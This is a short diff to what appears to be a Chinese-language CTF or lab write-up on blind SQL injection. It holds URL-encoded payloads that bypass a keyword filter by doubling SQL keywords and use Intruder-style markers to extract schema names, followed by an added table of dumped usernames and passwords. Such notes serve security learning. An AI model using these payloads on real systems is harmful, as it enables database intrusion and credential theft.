@@ -1036,4 +1036,10 @@ username=admin'%20anandd%20subsubstrstr((selselectect%20table_name%20frfromom%20
 username=admin'%20anandd%20subsubstrstr((selselectect%20group_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_name%3d'users'%20anandd%20table_schema%3ddatabase())%2c§1§%2c1)%20%3d%20'§i§'%20%23
 ```
 ![[Pasted image 20240328193336.png]]
+爆字段：
+
+| id  | username | password                         |
+| --- | -------- | -------------------------------- |
+| 0   | admin    | admin666666                      |
+| 1   | hazel    | a4e8361199324d30a359596ce4492a83 |
 
